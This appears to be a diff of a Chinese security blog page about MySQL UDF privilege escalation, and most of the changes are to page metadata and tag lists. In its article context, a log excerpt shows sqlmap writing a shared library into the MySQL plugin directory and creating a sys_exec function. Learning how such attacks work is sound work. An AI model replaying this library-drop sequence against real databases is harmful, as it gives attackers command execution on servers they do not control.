@@ -9,26 +9,29 @@
   <title>mysql-udf提权 | 珍惜现在</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="description" content="最近在一次授权测试中，从配置文件里读到了mysql的密码，连进去以后使用sqlmap想提权，但却始终没法提权，后来在锥宝宝的指导下复现了一下，大概搞明白了。 0x01 攻击模板   名称 详细描述    PreCondition 网络层：外网可以访问到mysql数据库服务；    应用层：1. 攻击者拿到了mysql数据库root账号和密码 2.secure-file-priv目录无限制；3. 启">
-<meta name="keywords" content="sqlmap,提权">
 <meta property="og:type" content="article">
 <meta property="og:title" content="mysql-udf提权">
-<meta property="og:url" content="http:&#x2F;&#x2F;www.t1ger.top&#x2F;2020&#x2F;04&#x2F;06&#x2F;mysql-udf%E6%8F%90%E6%9D%83&#x2F;index.html">
+<meta property="og:url" content="http://www.t1ger.top/2020/04/06/mysql-udf%E6%8F%90%E6%9D%83/index.html">
 <meta property="og:site_name" content="珍惜现在">
 <meta property="og:description" content="最近在一次授权测试中，从配置文件里读到了mysql的密码，连进去以后使用sqlmap想提权，但却始终没法提权，后来在锥宝宝的指导下复现了一下，大概搞明白了。 0x01 攻击模板   名称 详细描述    PreCondition 网络层：外网可以访问到mysql数据库服务；    应用层：1. 攻击者拿到了mysql数据库root账号和密码 2.secure-file-priv目录无限制；3. 启">
-<meta property="og:locale" content="en">
-<meta property="og:image" content="http:&#x2F;&#x2F;www.t1ger.top&#x2F;2020&#x2F;04&#x2F;06&#x2F;mysql-udf%E6%8F%90%E6%9D%83&#x2F;1.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;www.t1ger.top&#x2F;2020&#x2F;04&#x2F;06&#x2F;mysql-udf%E6%8F%90%E6%9D%83&#x2F;2.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;www.t1ger.top&#x2F;2020&#x2F;04&#x2F;06&#x2F;mysql-udf%E6%8F%90%E6%9D%83&#x2F;3.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;www.t1ger.top&#x2F;2020&#x2F;04&#x2F;06&#x2F;mysql-udf%E6%8F%90%E6%9D%83&#x2F;4.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;www.t1ger.top&#x2F;2020&#x2F;04&#x2F;06&#x2F;mysql-udf%E6%8F%90%E6%9D%83&#x2F;5.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;www.t1ger.top&#x2F;2020&#x2F;04&#x2F;06&#x2F;mysql-udf%E6%8F%90%E6%9D%83&#x2F;6.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;www.t1ger.top&#x2F;2020&#x2F;04&#x2F;06&#x2F;mysql-udf%E6%8F%90%E6%9D%83&#x2F;7.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;www.t1ger.top&#x2F;2020&#x2F;04&#x2F;06&#x2F;mysql-udf%E6%8F%90%E6%9D%83&#x2F;8.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;www.t1ger.top&#x2F;2020&#x2F;04&#x2F;06&#x2F;mysql-udf%E6%8F%90%E6%9D%83&#x2F;9.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;www.t1ger.top&#x2F;2020&#x2F;04&#x2F;06&#x2F;mysql-udf%E6%8F%90%E6%9D%83&#x2F;10.png">
-<meta property="og:updated_time" content="2020-04-06T08:19:30.244Z">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://www.t1ger.top/2020/04/06/mysql-udf%E6%8F%90%E6%9D%83/1.png">
+<meta property="og:image" content="http://www.t1ger.top/2020/04/06/mysql-udf%E6%8F%90%E6%9D%83/2.png">
+<meta property="og:image" content="http://www.t1ger.top/2020/04/06/mysql-udf%E6%8F%90%E6%9D%83/3.png">
+<meta property="og:image" content="http://www.t1ger.top/2020/04/06/mysql-udf%E6%8F%90%E6%9D%83/4.png">
+<meta property="og:image" content="http://www.t1ger.top/2020/04/06/mysql-udf%E6%8F%90%E6%9D%83/5.png">
+<meta property="og:image" content="http://www.t1ger.top/2020/04/06/mysql-udf%E6%8F%90%E6%9D%83/6.png">
+<meta property="og:image" content="http://www.t1ger.top/2020/04/06/mysql-udf%E6%8F%90%E6%9D%83/7.png">
+<meta property="og:image" content="http://www.t1ger.top/2020/04/06/mysql-udf%E6%8F%90%E6%9D%83/8.png">
+<meta property="og:image" content="http://www.t1ger.top/2020/04/06/mysql-udf%E6%8F%90%E6%9D%83/9.png">
+<meta property="og:image" content="http://www.t1ger.top/2020/04/06/mysql-udf%E6%8F%90%E6%9D%83/10.png">
+<meta property="article:published_time" content="2020-04-06T03:14:31.000Z">
+<meta property="article:modified_time" content="2020-04-06T08:19:30.244Z">
+<meta property="article:author" content="T1ger">
+<meta property="article:tag" content="sqlmap">
+<meta property="article:tag" content="提权">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http:&#x2F;&#x2F;www.t1ger.top&#x2F;2020&#x2F;04&#x2F;06&#x2F;mysql-udf%E6%8F%90%E6%9D%83&#x2F;1.png">
+<meta name="twitter:image" content="http://www.t1ger.top/2020/04/06/mysql-udf%E6%8F%90%E6%9D%83/1.png">
   
   
     <link rel="icon" href="/favicon.png">
@@ -44,7 +47,7 @@
 
   
 
-</head>
+<meta name="generator" content="Hexo 4.2.1"></head>
 
 <script src="jquery.js" type="text/javascript"></script>
 <body>
@@ -220,7 +223,7 @@
 <p>实验环境下，先看一眼之前mysql的权限。USER是mysql，这也就是说虽然我们是root账户启动的mysql，但实际上它的user是mysql。</p>
 <p><img src="/2020/04/06/mysql-udf%E6%8F%90%E6%9D%83/4.png" alt="image-20200406115951548"></p>
 <p>执行如下命令</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqld --defaults-file=/etc/my.cnf --user=root</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqld --defaults-file&#x3D;&#x2F;etc&#x2F;my.cnf --user&#x3D;root</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2020/04/06/mysql-udf%E6%8F%90%E6%9D%83/5.png" alt="image-20200406120409437"></p>
 <p>如此配置依旧不行，还会有路径报错。</p>
@@ -237,7 +240,7 @@
 <p>再次执行已经没有相关报错了</p>
 <p><img src="/2020/04/06/mysql-udf%E6%8F%90%E6%9D%83/10.png" alt="image-20200406154444380"></p>
 <h5 id="3-通过日志分析学习"><a href="#3-通过日志分析学习" class="headerlink" title="3. 通过日志分析学习"></a>3. 通过日志分析学习</h5><p>打开日志看下数据库都执行了什么，在数据库里执行命令</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set GLOBAL general_log=&apos;ON&apos;;</span><br><span class="line">SHOW VARIABLES LIKE &apos;general_log&apos;;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set GLOBAL general_log&#x3D;&#39;ON&#39;;</span><br><span class="line">SHOW VARIABLES LIKE &#39;general_log&#39;;</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">2020-04-06T07:06:51.138931Z        23 Query     UPDATE sqlmapfile SET data=CONCAT(data,0x80170000000000000800000000000000000000000000000008000000000000000000000000000000b7000000080000000300000000000000881720000000000088170000000000001000000000000000000000000000000008000000000000000000000000000000bc0000000100000000000000000000000000000000000000)</span><br><span class="line">2020-04-06T07:06:51.187541Z        23 Query     COMMIT</span><br><span class="line">2020-04-06T07:06:51.243918Z        23 Query     UPDATE sqlmapfile SET data=CONCAT(data,0x88170000000000009b000000000000000000000000000000010000000000000000000000000000000100000003000000000000000000000000000000000000002318000000000000c500000000000000000000000000000001000000000000000000000000000000)</span><br><span class="line">2020-04-06T07:06:51.357906Z        23 Query     SELECT data FROM sqlmapfile INTO DUMPFILE <span class="string">'/usr/lib64/mysql/plugin/libsigcn.so'</span></span><br><span class="line">2020-04-06T07:06:51.417004Z        23 Query     COMMIT</span><br><span class="line">2020-04-06T07:06:51.471030Z        23 Query     SELECT LENGTH(LOAD_FILE(<span class="string">'/usr/lib64/mysql/plugin/libsigcn.so'</span>))</span><br><span class="line">2020-04-06T07:06:53.483739Z        23 Query     CREATE FUNCTION sys_exec RETURNS int SONAME <span class="string">'libsigcn.so'</span></span><br></pre></td></tr></table></figure>
 
@@ -261,11 +264,11 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color2">sqlmap</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">sqlmap</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color3">提权</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">提权</a>
         		</li>
       		
 		</ul>
@@ -280,35 +283,35 @@
 <div class="share-btn share-icons tooltip-left">
   <div class="tooltip tooltip-east">
     <span class="tooltip-item">
-      <a href="javascript:;" target="_blank" rel="noopener" class="share-sns share-outer">
+      <a href="javascript:;" class="share-sns share-outer">
         <i class="icon icon-share"></i>
       </a>
     </span>
     <span class="tooltip-content">
       <div class="share-wrap">
         <div class="share-icons">
-          <a class="weibo share-sns" href="javascript:;" target="_blank" rel="noopener" data-type="weibo">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
             <i class="icon icon-weibo"></i>
           </a>
-          <a class="weixin share-sns wxFab" href="javascript:;" target="_blank" rel="noopener" data-type="weixin">
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
             <i class="icon icon-weixin"></i>
           </a>
-          <a class="qq share-sns" href="javascript:;" target="_blank" rel="noopener" data-type="qq">
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
             <i class="icon icon-qq"></i>
           </a>
-          <a class="douban share-sns" href="javascript:;" target="_blank" rel="noopener" data-type="douban">
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
             <i class="icon icon-douban"></i>
           </a>
-          <a class="qzone share-sns" href="javascript:;" target="_blank" rel="noopener" data-type="qzone">
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
             <i class="icon icon-qzone"></i>
           </a>
-          <a class="facebook share-sns" href="javascript:;" target="_blank" rel="noopener" data-type="facebook">
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
             <i class="icon icon-facebook"></i>
           </a>
-          <a class="twitter share-sns" href="javascript:;" target="_blank" rel="noopener" data-type="twitter">
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
             <i class="icon icon-twitter"></i>
           </a>
-          <a class="google share-sns" href="javascript:;" target="_blank" rel="noopener" data-type="google">
+          <a class="google share-sns" href="javascript:;" data-type="google">
             <i class="icon icon-google"></i>
           </a>
         </div>
@@ -318,7 +321,7 @@
 </div>
 
 <div class="page-modal wx-share js-wx-box">
-    <a class="close js-modal-close" href="javascript:;" target="_blank" rel="noopener"><i class="icon icon-close"></i></a>
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
       <img src="//pan.baidu.com/share/qrcode?url=http://www.t1ger.top/2020/04/06/mysql-udf%E6%8F%90%E6%9D%83/" alt="微信分享二维码">
@@ -335,6 +338,15 @@
   
 <nav id="article-nav">
   
+    <a href="/2020/07/30/Ossec/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          Ossec
+        
+      </div>
+    </a>
+  
   
     <a href="/2020/03/29/%E5%AF%B9CMCC%E4%B8%80%E9%94%AE%E7%99%BB%E5%BD%95%E8%BF%87%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E6%80%9D%E8%80%83/" id="article-nav-older" class="article-nav-link-wrap">
       <div class="article-nav-title">对CMCC一键登录过程的分析与思考</div>
@@ -348,7 +360,7 @@
     <div class="mod-side-operation">
         
         <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" target="_blank" rel="noopener" class="mod-side-operation__jump-to-top">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
                 <i class="icon-font icon-back"></i>
             </a>
             <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
@@ -444,11 +456,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
     
     
       
-      <li style="width: 50%" q-on="click: openSlider(e, 'innerArchive')"><a href="javascript:void(0)" target="_blank" rel="noopener" q-class="active:innerArchive">所有文章</a></li>
+      <li style="width: 50%" q-on="click: openSlider(e, 'innerArchive')"><a href="javascript:void(0)" q-class="active:innerArchive">所有文章</a></li>
       
         
       
-      <li style="width: 50%" q-on="click: openSlider(e, 'friends')"><a href="javascript:void(0)" target="_blank" rel="noopener" q-class="active:friends">友链</a></li>
+      <li style="width: 50%" q-on="click: openSlider(e, 'friends')"><a href="javascript:void(0)" q-class="active:friends">友链</a></li>
       
         
     </ul>
@@ -469,103 +481,111 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color4">ELK</a>
+                <a href="javascript:void(0)" class="js-tag color4">ELK</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color1">LINUX</a>
+                <a href="javascript:void(0)" class="js-tag color1">kafka</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color3">空间</a>
+                <a href="javascript:void(0)" class="js-tag color1">LINUX</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color2">Fedora</a>
+                <a href="javascript:void(0)" class="js-tag color3">空间</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color2">Centos</a>
+                <a href="javascript:void(0)" class="js-tag color2">Fedora</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color3">openvas</a>
+                <a href="javascript:void(0)" class="js-tag color2">Centos</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color1">linux</a>
+                <a href="javascript:void(0)" class="js-tag color3">openvas</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color1">debug</a>
+                <a href="javascript:void(0)" class="js-tag color1">linux</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color2">sqlmap</a>
+                <a href="javascript:void(0)" class="js-tag color1">debug</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color3">提权</a>
+                <a href="javascript:void(0)" class="js-tag color1">ossec</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color4">跨网段</a>
+                <a href="javascript:void(0)" class="js-tag color4">elk</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color4">vpn</a>
+                <a href="javascript:void(0)" class="js-tag color4">跨网段</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color3">PI</a>
+                <a href="javascript:void(0)" class="js-tag color4">vpn</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color4">SSL</a>
+                <a href="javascript:void(0)" class="js-tag color3">PI</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color4">VPN</a>
+                <a href="javascript:void(0)" class="js-tag color2">sqlmap</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color5">流量分析</a>
+                <a href="javascript:void(0)" class="js-tag color3">提权</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color3">无线</a>
+                <a href="javascript:void(0)" class="js-tag color2">modsecurity</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color3">攻击</a>
+                <a href="javascript:void(0)" class="js-tag color4">waf</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color2">钓鱼WIFI</a>
+                <a href="javascript:void(0)" class="js-tag color4">protocol</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color5">流量劫持</a>
+                <a href="javascript:void(0)" class="js-tag color3">无线</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color3">菠菜</a>
+                <a href="javascript:void(0)" class="js-tag color2">钓鱼WIFI</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color3">嗅探</a>
+                <a href="javascript:void(0)" class="js-tag color5">流量劫持</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color4">waf</a>
+                <a href="javascript:void(0)" class="js-tag color5">流量分析</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color4">webshell</a>
+                <a href="javascript:void(0)" class="js-tag color3">攻击</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color4">protocol</a>
+                <a href="javascript:void(0)" class="js-tag color3">嗅探</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">菠菜</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">webshell</a>
               </li>
             
             <div class="clearfix"></div>
@@ -626,6 +646,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           
             <li class="search-li">
               <a href="https://www.raosong.cc/" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>折戟</a>
+            </li>
+          
+            <li class="search-li">
+              <a href="https://www.jianshu.com/u/2f5082d01bec" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>东北人</a>
             </li>
           
         </ul>
